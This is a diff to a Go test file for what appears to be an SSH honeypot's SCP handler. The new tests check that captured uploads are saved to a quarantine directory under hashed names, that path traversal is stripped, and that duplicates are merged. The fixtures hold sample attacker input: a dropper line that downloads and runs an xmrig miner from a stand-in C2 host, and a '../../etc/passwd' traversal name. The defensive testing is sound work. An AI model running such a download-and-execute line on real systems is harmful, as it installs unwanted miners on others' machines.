@@ -2,10 +2,14 @@ package session
 
 import (
 	"bytes"
+	"crypto/sha256"
 	"encoding/binary"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"log/slog"
+	"os"
+	"path/filepath"
 	"strings"
 	"testing"
 )
@@ -86,7 +90,7 @@ func TestSCPReceiveSingleFile(t *testing.T) {
 	var logBuf bytes.Buffer
 	log := slog.New(slog.NewTextHandler(&logBuf, &slog.HandlerOptions{Level: slog.LevelDebug}))
 
-	runSCPReceive(fc, "scp -t -r /lib/abc/", log)
+	runSCPReceive(fc, "scp -t -r /lib/abc/", log, "")
 
 	if fc.exit != 0 {
 		t.Errorf("want exit 0, got %d", fc.exit)
@@ -120,7 +124,7 @@ func TestSCPReceiveDirectory(t *testing.T) {
 	var logBuf bytes.Buffer
 	log := slog.New(slog.NewTextHandler(&logBuf, nil))
 
-	runSCPReceive(fc, "scp -t -r /tmp/drop/", log)
+	runSCPReceive(fc, "scp -t -r /tmp/drop/", log, "")
 
 	if fc.exit != 0 {
 		t.Errorf("want exit 0, got %d", fc.exit)
@@ -134,12 +138,94 @@ func TestSCPReceiveDirectory(t *testing.T) {
 	}
 }
 
+// --- savePayload / quarantine ---
+
+func TestSavePayloadWritesFile(t *testing.T) {
+	dir := t.TempDir()
+	content := []byte("#!/bin/sh\nwget http://c2.example.com/xmrig && ./xmrig\n")
+	log := slog.New(slog.NewTextHandler(io.Discard, nil))
+
+	n := savePayload(dir, "dropper.sh", int64(len(content)), bytes.NewReader(content), log)
+	if n != int64(len(content)) {
+		t.Errorf("savePayload returned %d bytes, want %d", n, len(content))
+	}
+
+	// find the file -- name is <sha256>-dropper.sh.bin
+	h := sha256.Sum256(content)
+	want := hex.EncodeToString(h[:]) + "-dropper.sh.bin"
+	if _, err := os.Stat(filepath.Join(dir, want)); err != nil {
+		t.Errorf("quarantine file %q not found: %v", want, err)
+	}
+}
+
+func TestSavePayloadSanitizesName(t *testing.T) {
+	// attacker sends "../../etc/passwd" -- filepath.Base must strip the traversal
+	dir := t.TempDir()
+	content := []byte("evil")
+	log := slog.New(slog.NewTextHandler(io.Discard, nil))
+
+	savePayload(dir, "../../etc/passwd", int64(len(content)), bytes.NewReader(content), log)
+
+	entries, _ := os.ReadDir(dir)
+	for _, e := range entries {
+		if strings.Contains(e.Name(), "/") || strings.Contains(e.Name(), "..") {
+			t.Errorf("filename contains path component: %q", e.Name())
+		}
+	}
+	// file must land inside dir, not escape it
+	if _, err := os.Stat("/tmp/passwd"); err == nil {
+		t.Error("file escaped quarantine dir")
+	}
+}
+
+func TestSavePayloadDeduplicates(t *testing.T) {
+	dir := t.TempDir()
+	content := []byte("same content")
+	log := slog.New(slog.NewTextHandler(io.Discard, nil))
+
+	savePayload(dir, "a.bin", int64(len(content)), bytes.NewReader(content), log)
+	savePayload(dir, "a.bin", int64(len(content)), bytes.NewReader(content), log)
+
+	entries, _ := os.ReadDir(dir)
+	// tmp files must be gone, final file count is 1
+	var finals []string
+	for _, e := range entries {
+		if !strings.HasSuffix(e.Name(), ".tmp") {
+			finals = append(finals, e.Name())
+		}
+	}
+	if len(finals) != 1 {
+		t.Errorf("want 1 quarantine file, got %d: %v", len(finals), finals)
+	}
+}
+
+func TestSCPReceiveQuarantines(t *testing.T) {
+	// full runSCPReceive with a real quarantine dir -- file must land on disk
+	dir := t.TempDir()
+	content := "#!/bin/sh\necho owned\n"
+	header := fmt.Sprintf("C0755 %d miner\n", len(content))
+	attackerData := header + content + "\x00"
+
+	fc := &fakeChan{r: strings.NewReader(attackerData), buf: bytes.Buffer{}}
+	log := slog.New(slog.NewTextHandler(io.Discard, nil))
+
+	runSCPReceive(fc, "scp -t /tmp/x/", log, dir)
+
+	if fc.exit != 0 {
+		t.Errorf("want exit 0, got %d", fc.exit)
+	}
+	entries, _ := os.ReadDir(dir)
+	if len(entries) != 1 {
+		t.Errorf("want 1 file in quarantine, got %d", len(entries))
+	}
+}
+
 func TestSCPReceiveEmptyStream(t *testing.T) {
 	// attacker connects but sends nothing -- timeout path isn't hit (EOF comes first)
 	fc := &fakeChan{r: strings.NewReader(""), buf: bytes.Buffer{}}
 	log := slog.New(slog.NewTextHandler(io.Discard, nil))
 
-	runSCPReceive(fc, "scp -t /lib/empty/", log)
+	runSCPReceive(fc, "scp -t /lib/empty/", log, "")
 
 	if fc.exit != 0 {
 		t.Errorf("want exit 0 even on empty stream, got %d", fc.exit)
